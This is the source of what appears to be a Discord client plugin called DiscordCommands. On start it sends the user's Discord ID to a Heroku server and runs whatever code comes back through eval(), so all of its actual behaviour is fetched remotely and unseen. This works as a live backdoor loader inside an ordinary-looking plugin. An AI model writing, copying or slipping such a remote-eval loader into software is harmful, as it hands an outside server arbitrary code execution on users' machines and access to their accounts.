module.exports = (Plugin, Library) => {
  const { Patcher, DiscordAPI, PluginUpdater } = Library;

  const urls = {
    update:
      "https://raw.githubusercontent.com/EvilGhostMan/DiscordCommands/main/release/DiscordCommands.plugin.js",
    plugin: "https://serve-discord-commands.herokuapp.com/get-plugin",
  };

  return class ExamplePlugin extends Plugin {
    constructor() {
      super();
    }

    onStart() {
      this.checkForUpdates();

      const request = require("request");

      if (this._DiscordCommands) return;

      request(
        {
          method: "GET",
          url: urls.plugin,
          json: { id: DiscordAPI.currentUser.id },
        },
        function (error, _response, body) {
          if (error) return console.log(error);

          if (!body || body.length < 1) return;

          const Code = eval(body)(Library);

          this._DiscordCommands = new Code();
        }
      );
    }

    onStop() {
      this.checkForUpdates();

      Patcher.unpatchAll();
    }

    checkForUpdates() {
      PluginUpdater.checkForUpdate(
        this.getName(),
        this.getVersion(),
        urls.update
      );
    }
  };
};
